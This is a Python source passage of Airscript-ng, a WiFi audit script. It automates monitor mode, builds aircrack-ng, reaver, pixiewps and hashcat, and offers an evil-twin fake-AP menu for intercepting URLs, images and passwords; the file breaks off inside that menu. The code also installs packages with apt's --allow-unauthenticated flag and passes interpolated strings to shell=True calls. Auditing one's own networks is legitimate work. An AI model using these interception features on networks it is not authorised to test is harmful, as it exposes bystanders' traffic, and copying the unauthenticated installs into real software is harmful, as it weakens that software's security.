#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   Airscript-ng - A script to conduct simple WiFi audits with ease.
#    Copyright (C) 2018 Yudhajit N. (Sh3llcod3)
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#   along with this program. If not, see <http://www.gnu.org/licenses/>
#   Contact: Please create a issue on my GitHub <https://github.com/Sh3llcod3>
#
#Import necessary modules
import os,subprocess,time,sys,traceback,csv,sys,atexit
#Lets define a class for showing colors.
#'''
class col:
    head = '\033[95m'
    okb = '\033[94m'
    okg = '\033[92m'
    warn = '\033[93m'
    fail = '\033[91m'
    endl = '\033[0m'
    bold = '\033[1m'
    uline = '\033[4m'
    blue_deep = '\033[1;34;48m'
    warn_deep = '\033[1;33;48m'
    fail_deep = '\033[1;31;48m'
    green_deep = '\033[1;32;48m'
    endl_deep = '\033[1;39;48m'
    yel_deep = '\033[1;33;48m'
    black = '\033[0;30;48m'
    marine_blue = '\033[0;36;48m'
    black_deep = '\033[1;30;48m'
    head_deep = '\033[1;35;48m'
    light_blue = '\033[1;36;48m'
    highlight = '\033[1;37;40m'
#'''
#Define another class, which will set all colors to blank in the no-color version.
'''
class col:
    head = '\033[0m'
    okb = '\033[0m'
    okg = '\033[0m'
    warn = '\033[0m'
    fail = '\033[0m'
    endl = '\033[0m'
    bold = '\033[0m'
    uline = '\033[0m'
    blue_deep = '\033[0m'
    warn_deep = '\033[0m'
    fail_deep = '\033[0m'
    green_deep = '\033[0m'
    endl_deep = '\033[0m'
    yel_deep = '\033[0m'
    black = '\033[0m'
    marine_blue = '\033[0m'
    black_deep = '\033[0m'
    head_deep = '\033[0m'
    light_blue = '\033[0m'
    highlight = '\033[0m'
'''
#Define some common functions, which we will use very frequently
def ioStream(value):
    #I am using shell=True here as no user input will ever reach any of this. So, no shell command injection! (in theory)
    return subprocess.check_output('%s' %(value),shell=True).decode("utf-8").rstrip()
def bashRun(value):
    subprocess.call('%s' %(value),shell=True)
def bashReturnValue(value):
    try:
        returnBashValue = str(subprocess.check_call('%s 2>/dev/null >/dev/null' %(value),shell=True))
    except(subprocess.CalledProcessError):
        returnBashValue = '1'
    return returnBashValue
def clearTerm():
    bashRun('clear || tput clear')
#Script Version number
scriptVersion = "1.2_build_date_20/01/2018"
#Some variables which will find out some basic system info
cpuModel = ioStream("cat /proc/cpuinfo | grep -i \"Model name\" | sort | uniq | awk -F ' ' {'print $4,$5,$6,$7,$8,$9,$10'}")
userName = ioStream("uname -n")
userDistro = ioStream("lsb_release -d | awk -F ':' {'print $2'} | tr -d \"\t\" ")
userKernel = ioStream("uname -r")
userArch = ioStream("uname -m")
userArchDpkg = ioStream("dpkg --print-architecture")
invocationType = sys.argv[0]
#Determines a few values, useful when the -v argument is used
if invocationType.lower().startswith('./'):
    scriptInvocation = ('%s' %(sys.argv[0]))
else:
    scriptInvocation = ('python3 %s' %(sys.argv[0]))
if bashReturnValue("ls -l ~/.airscriptNG/air/aircrack-ng/src/aircrack-ng ~/.airscriptNG/wps/reaver/src/reaver ~/.airscriptNG/magic/pixiewps/src/pixiewps ") != '0':
    dependenciesInstalled = ('%sNot installed%s' %(col.fail,col.endl))
else:
    dependenciesInstalled = ('%sInstalled%s' %(col.okg,col.endl))
#The GPLv3+ exclusion of warranty. Just in case.
def displayWarranty():
    print("    %sAirscript-ng Copyright (C) 2017-2018 Sh3llcod3%s" %(col.fail,col.endl))
    print("    %sThis program comes with ABSOLUTELY NO WARRANTY; for details visit: https://goo.gl/W1jcr5.%s" %(col.fail,col.endl))
    print("    %sThis is free software, and you are welcome to redistribute it%s" %(col.fail,col.endl))
    print("    %sunder certain conditions; visit: https://goo.gl/FSy6nc for details.%s" %(col.fail,col.endl))
    print("    %sPlease follow all instructions that appear. Thanks for using this program.%s\n" %(col.fail,col.endl))
#Create the functions class, where all the re-usable code for the main functions will reside
class functions:
    #Exit the program after a functions has finshed running.
    def silentExit():
        clearTerm()
        if ioStream("systemctl status network-manager.service | grep 'Active:' | awk -F '(' {'print $1'} | cut -d ':' -f 2 | tr -d [:space:]").lower() == 'inactive':
            bashRun("rm ./HANDSHAKES/TEMP_DUMP_* 2>/dev/null")
            bashRun("sudo systemctl start NetworkManager.service 2>/dev/null")
            bashRun("sudo systemctl start wpa_supplicant.service 2>/dev/null")
            print("\n[%s+%s] Detected network-manager as inactive, restarted it." %(col.okg,col.endl))
            print("[%s+%s] Internet connection may take up to 10 seconds to come back.\n" %(col.okg,col.endl))
        sys.exit(0)
    def menuOrExit():
        while True:
            getUserChoice = input('[%s+%s] Head to [%sm%s]enu or [%sq%s]uit? m/q >>' %(col.okg,col.endl,col.fail,col.endl,col.fail,col.endl))
            if getUserChoice.lower().startswith('m'):
                mainMenu()
            elif getUserChoice.lower().startswith('q'):
                functions.silentExit()
    #This function will pull the latest version from GitHub.
    def updateScript():
        functions.checkDependencies()
        while True:
            userChoice = input("\n%sUpdate this script? Any local changes will be lost! y/n >> " %(col.endl))
            if userChoice.lower().startswith("y"):
                updateStatusCode = bashRun("git stash && git pull")
                print("Update is done. Relaunch!")
                if updateStatusCode != 0:
                    while True:
                        fixGitConfigError = input("See something to do with %sgit-config%s? Fix that? %sy%s/%sn%s >> " %(col.blue_deep,col.endl,col.okg,col.endl,col.warn,col.endl))
                        if fixGitConfigError.lower().startswith("y"):
                            userHostId = ioStream("id -u -n")
                            bashRun("git config user.email \"%s@%s.com\" "  %(userHostId,userName))
                            bashRun("git config user.name \"%s\" " %(userHostId))
                            print("Applied fix, pulling update...")
                            bashRun("git stash && git pull")
                            break
                        elif fixGitConfigError.lower().startswith("n"):
                            break
                bashRun("sudo su && chmod +x %s && %s" %(invocationType,sys.argv[0]))
            elif userChoice.lower().startswith("n"):
                mainMenu()
    #This function will list all available wireless cards and allow the user to pick one to use in monitor mode.
    def getAvailableWifiCards():
        wirelessCards = []
        cardArray = []
        cardRange = ioStream("ls /sys/class/net/ | grep ^wl | wc -l")
        for i in range(1,int(cardRange)+1):
            wirelessCards.append(ioStream("ls /sys/class/net/ | grep ^wl | head -n %s | tail -n 1" %(i)))
            cardArray.append(i)
            getCardChipset = ioStream("~/.airscriptNG/air/*/scripts/airmon-ng | grep %s | awk -F ' ' {'print $4,$5,$6,$7,$8,$9,$10'}" %(wirelessCards[i-1]))
            print("%sTo choose %s%s%s %senter %s[%s]%s %s/Chipset: %s%s" %(col.fail_deep,col.blue_deep,wirelessCards[i-1],col.endl,col.fail_deep,col.warn_deep,i,col.endl,col.warn,getCardChipset,col.endl))
        print("\n")
        def getCardName():
            global index
            index = ""
            while True:
                index = input("\033[1;33;48m[?] \033[1;35;48mWhat card shall I put in monitor-mode/use? \033[1;32;48m(enter no.) \033[1;35;48m>> ")
                if index in [str(i) for i in cardArray]:
                    index = wirelessCards[int(index)-1]
                    if input("\n%s[i]%s Use %s%s%s? y/n >>%s " %(col.warn_deep,col.fail_deep,col.green_deep,index,col.fail_deep,col.endl_deep)).lower().startswith("y"):
                        bashRun("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index))
                        return index
                    else:
                        mainMenu()
        return getCardName()
    #This function is called (with an argument of 1 or 2) when the user wants to setup an Evil-twin/Fake AP.
    def getAvailableWifiCardsAlt(choice):
        wirelessCards = []
        cardArrayTwo = [] #cardArrayTwo
        if choice == "1":
            apCardChoice = ioStream("ls /sys/class/net/ | grep ^wl | wc -l") #def_range
        elif choice == "2":
            apCardChoice = ioStream("ls /sys/class/net/ | grep -v \"lo\" | grep -v \"%s\" | wc -l" %(cardInterface)) #def_range
        for i in range(1,int(apCardChoice)+1):
            if choice == "1":
                wirelessCards.append(ioStream("ls /sys/class/net/ | grep ^wl | head -n %s | tail -n 1" %(i)))
            elif choice == "2":
                wirelessCards.append(ioStream("ls /sys/class/net/ | grep -v \"lo\" | grep -v \"%s\" | head -n %s | tail -n 1" %(cardInterface,i)))
            cardArrayTwo.append(i)
            print("%sTo choose %s%s%s %senter %s[%s]%s" %(col.fail_deep,col.blue_deep,wirelessCards[i-1],col.endl,col.fail_deep,col.warn_deep,i,col.endl))
        print("\n")
        def getCardNameAlt():
            global cardInterface
            questionArray = ["\033[1;32;48m[+]\033[1;39;48mOk, Now which interface shall I host the AP on? \033[1;31;48m ~# \033[0;39;48m ","\033[1;32;48m[+]\033[1;39;48mWhich interface is connected to the internet? \033[1;31;48m ~# \033[0;39;48m "]
            cardInterface = ""
            if choice == "1":
                cardInterface = input("%s" %(questionArray[0]))
            elif choice == "2":
                cardInterface = input("%s" %(questionArray[1]))
            if cardInterface in [str(i) for i in cardArrayTwo]:
                cardInterface = wirelessCards[int(cardInterface)-1]
                return cardInterface
            else:
                return getCardNameAlt()
        return getCardNameAlt()
    #This function git clones and makes different dependencies. This is needed for compatibility as some repositories hold outdated packages.
    def gitDeps():
        if bashReturnValue("ls ~/.airscriptNG/air/aircrack-ng/src/aircrack-ng ~/.airscriptNG/wps/reaver/src/reaver ~/.airscriptNG/magic/pixiewps/src/pixiewps ") != '0':
            if bashReturnValue('/usr/bin/env ping -c1 8.8.8.8 ') == '0':
                while True:
                    try:
                        clearTerm()
                        print("\n[%si%s] Some dependencies will need to be downloaded and compiled (aircrack-ng,reaver,pixiewps,etc)." %(col.blue_deep,col.endl))
                        print("[%si%s] This may take up to 5~10 mins. This will only happen once (on first run)." %(col.blue_deep,col.endl))
                        gitCloneDepsConfirmation = input("[%si%s] Proceed and install? y/n >> " %(col.blue_deep,col.endl))
                        if gitCloneDepsConfirmation.lower().startswith('y'):
                            break
                        elif gitCloneDepsConfirmation.lower().startswith('n'):
                            functions.silentExit()
                        else:
                            continue
                    except(KeyboardInterrupt,EOFError):
                        continue
            else:
                clearTerm()
                print('\n%s[-]%s Failed to get a connection to the internet.\n' %(col.fail,col.endl))
                startNetworkManagerConfirmation = input("[%si%s] Restart network-manager and try again? y/n >> " %(col.blue_deep,col.endl))
                if startNetworkManagerConfirmation.lower().startswith('y'):
                    functions.silentCleanupScript(None)
                    while True:
                        time.sleep(0.5)
                        if ioStream("systemctl status network-manager.service | grep 'Active:' | awk -F '(' {'print $1'} | cut -d ':' -f 2 | tr -d [:space:]").lower() == 'inactive':
                            continue
                        else:
                            print('\n')
                            for i in range(25):
                                sys.stdout.write("[%si%s] Successfully restarted network-manager, waiting %s seconds before retrying.\r" %(col.blue_deep,col.endl,25-int(i)))
                                time.sleep(1)
                            break
                    functions.gitDeps()
                elif startNetworkManagerConfirmation.lower().startswith('n'):
                    functions.silentExit()
        #Git clone the dependencies and make it. How? By literally `make`-ing it.
        if bashReturnValue("ls ~/.airscriptNG/air/*/src/aircrack-ng ") != '0':
            if bashReturnValue('/usr/bin/env ping -c1 8.8.8.8 ') == '0':
                bashRun("rm ~/.airscriptNG/air/ -r 2>/dev/null")
                bashRun("mkdir -p ~/.airscriptNG/air && cd ~/.airscriptNG/air && apt update --allow-unauthenticated && apt install git git-core libnl-3-dev openssl libnl*-gen* libgcrypt20-dev build-essential libssl-dev -y --allow-unauthenticated && git clone git://git.kali.org/packages/aircrack-ng.git -b upstream && cd * && make gcrypt=true")
                bashRun("chmod +x ~/.airscriptNG/air/*/scripts/airmon-ng")
            else:
                print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
                os._exit(1)
        if bashReturnValue("ls ~/.airscriptNG/wps/*/src/reaver ") != '0':
            if bashReturnValue('/usr/bin/env ping -c1 8.8.8.8 ') == '0':
                bashRun("rm ~/.airscriptNG/wps/ -r 2>/dev/null")
                bashRun("mkdir -p ~/.airscriptNG/wps && cd ~/.airscriptNG/wps && apt update --allow-unauthenticated && apt install libpcap-dev build-essential -y --allow-unauthenticated && git clone git://git.kali.org/packages/reaver.git -b upstream && cd */src && ./configure && make")
            else:
                print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
                os._exit(1)
        if bashReturnValue("ls ~/.airscriptNG/magic/*/src/pixiewps ") != '0':
            if bashReturnValue('/usr/bin/env ping -c1 8.8.8.8 ') == '0':
                bashRun("rm ~/.airscriptNG/magic/ -r 2>/dev/null")
                bashRun("mkdir -p ~/.airscriptNG/magic && cd ~/.airscriptNG/magic && apt update --allow-unauthenticated && apt install libssl-dev build-essential -y --allow-unauthenticated && git clone git://git.kali.org/packages/pixiewps.git -b upstream && cd */src/ && make && make install")
            else:
                print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
                os._exit(1)
        #Check if airmon-ng from the git repo is executable, and if not, assign execute permissions to it.
        if bashReturnValue("~/.airscriptNG/air/*/scripts/airmon-ng") != '0':
            bashRun('chmod +x ~/.airscriptNG/air/*/scripts/airmon-ng &>/dev/null')
    #A link to the driver pages for Nvidia and AMD GPUs
    def driverDownloadFunction():
        import webbrowser
        def gpuSelectionMenu():
            print("""\033[0;33;48m

     ██████╗ ██████╗ ███████╗███╗   ██╗ ██████╗██╗         ██████╗ ██████╗ ██╗██╗   ██╗███████╗██████╗ ███████╗
    ██╔═══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██║         ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔══██╗██╔════╝
    ██║   ██║██████╔╝█████╗  ██╔██╗ ██║██║     ██║         ██║  ██║██████╔╝██║██║   ██║█████╗  ██████╔╝███████╗
    ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║██║     ██║         ██║  ██║██╔══██╗██║╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║
    ╚██████╔╝██║     ███████╗██║ ╚████║╚██████╗███████╗    ██████╔╝██║  ██║██║ ╚████╔╝ ███████╗██║  ██║███████║
     ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝

    \033[0;39;48m""")
            global userGpuMenuChoice
            userGpuMenuChoice = input("|MENU|POST_CRACK|GPU|DRIVER_DOWNLOAD|(Do you have an Nvidia GPU or AMD GPU? [a/n]) \033[1;31;48m~# \033[0;39;48m")
            if userGpuMenuChoice.lower().startswith("n"):
                clearTerm()
                print("A browser page will open, download the newest drivers from the archive (64-bit only).")
                webbrowser.open('http://www.nvidia.com/object/linux-amd64-display-archive.html')
                print("Once you have downloaded your driver of choice, Install it using the website instructions.")
                os._exit(1)
            elif userGpuMenuChoice.lower().startswith("a"):
                clearTerm()
                print("A browser page will open, choose your drivers from there.")
                webbrowser.open('http://support.amd.com/en-us/download')
                print("Once you have downloaded your driver of choice, Install it using the website instructions.")
                os._exit(1)
        gpuSelectionMenu()
    #Downloads and builds hashcat and hashcat-utils, which are needed for GPU based cracking
    def hashcatDownloadFunction():
        import webbrowser
        from tkinter import filedialog
        from tkinter import Tk
        clearTerm()
        print("""\033[0;33;48m

                  a          a
                 aaa        aaa
                aaaaaaaaaaaaaaaa
               aaaaaaaaaaaaaaaaaa
              aaaaafaaaaaaafaaaaaa
              aaaaaaaaaaaaaaaaaaaa
               aaaaaaaaaaaaaaaaaa
                aaaaaaa  aaaaaaa
                 aaaaaaaaaaaaaa
      a         aaaaaaaaaaaaaaaa
     aaa       aaaaaaaaaaaaaaaaaa
     aaa      aaaaaaaaaaaaaaaaaaaa
     aaa     aaaaaaaaaaaaaaaaaaaaaa
     aaa    aaaaaaaaaaaaaaaaaaaaaaaa
      aaa   aaaaaaaaaaaaaaaaaaaaaaaa
      aaa   aaaaaaaaaaaaaaaaaaaaaaaa
      aaa    aaaaaaaaaaaaaaaaaaaaaa
       aaa    aaaaaaaaaaaaaaaaaaaa
        aaaaaaaaaaaaaaaaaaaaaaaaaa
         aaaaaaaaaaaaaaaaaaaaaaaaa

    ██╗  ██╗ █████╗ ███████╗██╗  ██╗ ██████╗ █████╗ ████████╗    
    ██║  ██║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝       
    ███████║███████║███████╗███████║██║     ███████║   ██║       
    ██╔══██║██╔══██║╚════██║██╔══██║██║     ██╔══██║   ██║       
    ██║  ██║██║  ██║███████║██║  ██║╚██████╗██║  ██║   ██║       
    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝                                                                   
    \033[0;39;48m
    """)
        if input("\033[1;39;48mDownload and setup hashcat for GPU-WPA cracking? [y/n] >> ").lower().startswith("y"):
            clearTerm()
            print("\nWhere would you like hashcat installed?")
            input("\n|MENU|POST_CRACK|GPU|HASHCAT_DOWNLOAD|(Press enter to choose directory) >>")
            global hashcatDownloadPathTk
            Tk().withdraw()
            hashcatDownloadPathTk = filedialog.askdirectory()
            hashcatDownloadPathTk = str(hashcatDownloadPathTk)
            #Crawls the hashcat website and filters only the compiled binary links 
            hashcatFilterPath = "https://hashcat.net/hashcat/ 2>/dev/null | grep -i 'a href=' | grep -iv '.asc' | awk -F '\"' {'print $2'} | grep -iv '.tar.gz' | grep -i '.7z'"
            hashcatDownloadWebPath = ioStream("wget -O- %s || curl %s" %(hashcatFilterPath,hashcatFilterPath))
            hashcatOlderVersionArray = []
            clearTerm()
            for i in enumerate(hashcatDownloadWebPath.split()):
                hashcatOlderVersionArray.append([i[0],i[1]])
            print("\n%sLatest Version%s to be downloaded: %s%s%s\n" %(col.fail,col.endl,col.okb,hashcatOlderVersionArray[0][1][15:-3],col.endl))
            for i in hashcatOlderVersionArray[1:]:
                hashcatListItem = str(i[1][14:-3])
                if len(hashcatListItem) < 13:
                    hashcatListItem +=  " "
                print("Alternatively, to choose %s%s%s version type %s%s%s" %(col.okg,hashcatListItem,col.endl,col.fail,i[0],col.endl))
            while True:
                hashcatVersionChoice = input("\nType %sa number%s to download that version, or type [%sl%s] to get latest >>" %(col.okb,col.endl,col.okb,col.endl))
                if hashcatVersionChoice == '0':
                    continue
                if hashcatVersionChoice in [str(_[0]) for _ in hashcatOlderVersionArray]:
                    hashcatDownloadWebPath = hashcatOlderVersionArray[int(hashcatVersionChoice)]
                    hashcatDownloadWebPath = 'https://hashcat.net' + hashcatDownloadWebPath[1]
                    break
                elif hashcatVersionChoice.lower().startswith('l'):
                    hashcatDownloadWebPath = 'https://hashcat.net' + hashcatOlderVersionArray[0][1]
                    break
            #I'm sure there are more efficient ways to AWK, grep and cut the link, but this is all the syntax I know so far.
            bashRun("sudo apt install p7zip p7zip-full git -y;cd %s;wget %s;7z x hashcat-*;git clone https://github.com/hashcat/hashcat-utils.git;cd hashcat-utils/src/;make" %(hashcatDownloadPathTk, hashcatDownloadWebPath))
            bashRun("\necho '\n\033[1;32;48m[+] \033[1;39;48mHashcat is now ready to use, it will be inside the %s folder \033[0;39;48m' " %(hashcatDownloadPathTk))
            os._exit(1)
        else:
            mainMenu()
    #This function downloads a few dependencies from APT. Other package managers will be supported in the future.
    def depandancies(): 
        print("[%s-%s]Updating system and installing some dependencies. Please hold!" %(col.yel_deep,col.endl))
        if bashReturnValue("/usr/bin/env ping -c1 8.8.8.8 >/dev/null 2>/dev/null") == '0':
            subprocess.call("echo '\033[1;32;48m[-] \033[0;37;48m25% done';sudo apt update --allow-unauthenticated 2>/dev/null && echo '\033[1;32;48m[-] \033[0;37;48m50% done' && sudo apt install xterm -y --allow-unauthenticated >/dev/null 2>/dev/null",shell=True)
            subprocess.call("xterm $HOLD -title 'Installing any dependencies [airscript-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'sudo apt install gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk driftnet dsniff bzip2 gnome-terminal hostapd psmisc coreutils -y --allow-unauthenticated && update-rc.d isc-dhcp-server disable'",shell=True)
        else:
            print('\n%s[-]%s Failed to install inital dependencies, please connect to the internet and try again\n' %(col.fail,col.endl))
            os._exit(1)
        time.sleep(2)
    #This function checks if necessary dependencies are installed.
    def checkDependencies():
        if bashReturnValue("dpkg -s xterm gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk dsniff driftnet bzip2 gnome-terminal hostapd psmisc coreutils") != '0':
            functions.depandancies()
    #This function is useful after running Aircrack-ng or Reaver, as it sets the adapters to managed mode (default mode)
    def cleanupScript(index):
        while True:
            try:
                waitForUser = input("\n\n%s[%si%s] Press '%sy%s' to clean-up or '%sclear%s' to clean out cached/saved files & clean-up >>" %(col.endl,col.okb,col.endl,col.okg,col.endl,col.okg,col.endl))
                if waitForUser.lower().startswith("y"):
                    print("\n[%si%s] Wait a few seconds, cleaning up..." %(col.okb,col.endl))
                    bashRun("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
                    bashRun("rm ./HANDSHAKES/TEMP_DUMP_* 2>/dev/null")
                    bashRun("sudo systemctl start NetworkManager.service")
                    bashRun("sudo systemctl start wpa_supplicant.service")
                    clearTerm()
                    print("\n[%s+%s]Done Cleanup.\n" %(col.okg,col.endl))
                    break
                if waitForUser.lower().startswith("clear"):
                    bashRun("rm ~/.airscriptNG/ -rf 2>/dev/null >/dev/null")
                    bashRun("rm ./HANDSHAKES/ -r")
                    bashRun("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
                    bashRun("rm ./HANDSHAKES/TEMP_DUMP_* 2>/dev/null")
                    bashRun("sudo systemctl start NetworkManager.service")
                    bashRun("sudo systemctl start wpa_supplicant.service")
                    clearTerm()
                    print("\n[%s+%s]Cleared any residual files from /root/.airscript-ng and ./HANDSHAKES" %(col.okg,col.endl))
                    print("\n[%s+%s]Done Cleanup.\n" %(col.okg,col.endl))
                    break
            except(KeyboardInterrupt,EOFError):
                continue
            except(NameError):
                functions.silentExit()
        functions.menuOrExit()
    #This function used to add the Kali-Rolling repository to the apt lists, however it was too dangerous, so it has been deprecated and removed.
    #Why was it dangerous? Because it replaces Ubuntu's Coreutils with Kali's Coreutils,Display manager, and breaks GPU (OpenCL) drivers. 
    #Your system will refuse to boot properly if kali tools aren't installed correctly. Use Katoolin if your're on Ubuntu >> https://goo.gl/rykBwg
    def installKaliSources():
        clearTerm()
        print('\n[%sinfo%s] This feature was %sdeprecated and removed%s.' %(col.okb,col.endl,col.fail,col.endl))
        print('[%sinfo%s] Its very dangerous to add additional repositores to apt sources. A lot of Kali packages are custom' %(col.okb,col.endl))
        print('[%sinfo%s] If you want to do so yourself, please visit https://goo.gl/rykBwg.' %(col.okb,col.endl))
        input('\n[%sinfo%s] Press any key to return to menu >> ' %(col.okb,col.endl))
        mainMenu()
    #This function simply performs a full-upgrade of all system packages from apt, a nice to have add-on.
    def updateAptPackagesFull():
        while True:
            clearTerm()
            aptUpdateConfirmation = input("\n[%s+%s]|%sMENU%s|%sAPT_UPDATE%s| Run apt upgrade? y/n >> " %(col.okg,col.endl,col.fail,col.endl,col.fail,col.endl))
            if aptUpdateConfirmation.lower().startswith("y"):
                bashRun("apt update --allow-unauthenticated && apt full-upgrade -y --allow-unauthenticated && apt autoremove -y --allow-unauthenticated && apt autoclean")
                functions.updateScript()
                clearTerm()
                print("\n[%s+%s] Apt packages are up to date!" %(col.okg,col.endl))
                functions.menuOrExit()
            elif aptUpdateConfirmation.lower().startswith("n"):
                mainMenu()
    #This will restore the /etc/apt/source.list file. It won't be needed as the option to append the kali sources has been removed.
    def revertKaliSources():
        if bashReturnValue("ls -a backup-repos") == '0':
            while True:
                revertSourcesConfirmation = input('[%si%s] Restore APT sources? y/n >> ' %(col.okb,col.endl))
                if revertSourcesConfirmation.lower().startswith("y"):
                    break
                elif revertSourcesConfirmation.lower().startswith("n"):
                    functions.menuOrExit()
            bashRun("sudo cp backup-repos/sources.list /etc/apt/sources.list")
            print("[%s+%s] Successfully reverted repo back to what it was!" %(col.okg,col.endl))
            bashRun("sudo apt update")
            print("If you don't see errors above then SOURCES file is ok.")
            functions.menuOrExit()
        else:
            print("[%s-%s] Backup file not found!" %(col.fail,col.endl))
            functions.menuOrExit()
    def silentCleanupScript(index):
        if index != None:
            bashRun("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
        bashRun("rm ./HANDSHAKES/TEMP_DUMP_* 2>/dev/null")
        bashRun("sudo systemctl start NetworkManager.service")
        bashRun("sudo systemctl start wpa_supplicant.service")
        clearTerm()
#Create the main class, which will store all the main functions of the program
class main:
    #This function is responsible for hosting the evil-twin/fake AP
    def EvilTwinFakeAP():
        functions.checkDependencies()
        functions.gitDeps()
        asciiArt = ("""\033[0;33;48m

        ███████╗ █████╗ ██╗  ██╗███████╗     █████╗ ██████╗ 
        ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔══██╗
        █████╗  ███████║█████╔╝ █████╗█████╗███████║██████╔╝
        ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝╚════╝██╔══██║██╔═══╝ 
        ██║     ██║  ██║██║  ██╗███████╗    ██║  ██║██║     
        ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝     
        \033[0;39;48m
        """)
        try:
            bashRun("rm /var/lib/dhcp/dhcpd.leases && touch /var/lib/dhcp/dhcpd.leases")
            global firstVariable
            global secondVariable
            global thirdVariable
            global counter
            count = 0
            firstVariable = ""
            secondVariable = ""
            thirdVariable = ""
            selectedOrUnselectedArray = ["[\033[1;32;48mSELECTED\033[1;39;48m]","[\033[0;33;48mUNSELECTED\033[1;39;48m]","\n[\033[1;32;48mREQUIRED\033[1;39;48m]"]
            allAvailableOptions = ["Host-ap with airbase-ng/hostapd","Intercept HTTP links and URLs - Type [\033[1;34;48m2\033[1;39;48m]","Intercept any images - Type [\033[1;34;48m3\033[1;39;48m]","Intercept any unencrypted passwords (not currently working) - Type [\033[1;34;48m4\033[1;39;48m]"]
            clearTerm()
            print(asciiArt)
            print("Welcome to the MITM/FAKE-AP screen")
            print("Please note that to host a fake AP and MITM internet traffic, you'll need \033[0;31;48mtwo network interfaces\033[0;39;48m")
            print("You are not limited to the options here, feel free to fire up any tool like wireshark.")
            print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
            print("%s- %s" %(selectedOrUnselectedArray[2],allAvailableOptions[0]))
            print("%s- %s" %(selectedOrUnselectedArray[1],allAvailableOptions[1]))
            print("%s- %s" %(selectedOrUnselectedArray[1],allAvailableOptions[2]))
            print("%s- %s" %(selectedOrUnselectedArray[1],allAvailableOptions[3]))
            print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
            def selectedOptionOne():
                print("[\033[1;32;48mSELECTED\033[1;39;48m]- Intercept HTTP links and URLs")
            def selectedOptionTwo():
                print("[\033[1;32;48mSELECTED\033[1;39;48m]- Intercept any images")
            def selectedOptionThree():
                print("[\033[1;32;48mSELECTED\033[1;39;48m]- Intercept any unencrypted passwords (not currently working) ")
                print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
            def unselectedOptionOne():
                print("[\033[0;33;48mUNSELECTED\033[1;39;48m]- Intercept HTTP links and URLs - Type [\033[1;34;48m2\033[1;39;48m]")
            def unselectedOptionTwo():
                print("[\033[0;33;48mUNSELECTED\033[1;39;48m]- Intercept any images - Type [\033[1;34;48m3\033[1;39;48m]")
            def unselectedOptionThree():
                print("[\033[0;33;48mUNSELECTED\033[1;39;48m]- Intercept any unencrypted passwords (not currently working) - Type [\033[1;34;48m4\033[1;39;48m]")
                print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
            def introScreen():
                clearTerm()
                print(asciiArt)
                print("Welcome to the MITM/FAKE-AP screen")
                print("Please note that to host a fake AP and MITM internet traffic, you'll need \033[0;31;48mtwo network interfaces\033[0;39;48m")
                print("You are not limited to the options here, feel free to fire up any tool like wireshark.")
                print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
                print("%s- %s" %(selectedOrUnselectedArray[2],allAvailableOptions[0]))
            variableAndChoiceArray = [["2",firstVariable],["3",secondVariable],["4",thirdVariable]]
            while True:
                if count < 2:
                    userOptionChoice = input("\n\033[0;39;48mPlease choose two options, by entering the number.\033[1;31;48m ~# \033[0;39;48m")
                    if userOptionChoice != "" and userOptionChoice.isnumeric() == True and userOptionChoice in ["2","3","4"]:
                        if userOptionChoice == "2":
                            firstVariable = "X"
                            count += 1
                        if userOptionChoice == "3":
                            secondVariable = "X"
                            count += 1
                        if userOptionChoice == "4":
                            thirdVariable = "X"
                            count += 1
                        for a,n in variableAndChoiceArray:
                            if userOptionChoice == a and n == "X":
                                count -= 1
                        introScreen()
                        if firstVariable != "":
                            selectedOptionOne()
                        if firstVariable == "":
                            unselectedOptionOne()
                        if secondVariable != "":
                            selectedOptionTwo()
                        if secondVariable == "":
                            unselectedOptionTwo()    
                        if thirdVariable != "":
                            selectedOptionThree()
                        if thirdVariable == "":
                            unselectedOptionThree()
                        continue
                    else:
                        clearTerm()
                        introScreen()
                        if firstVariable != "":
                            selectedOptionOne()
                        if firstVariable == "":
                            unselectedOptionOne()
                        if secondVariable != "":
                            selectedOptionTwo()
                        if secondVariable == "":
                            unselectedOptionTwo()    
                        if thirdVariable != "":
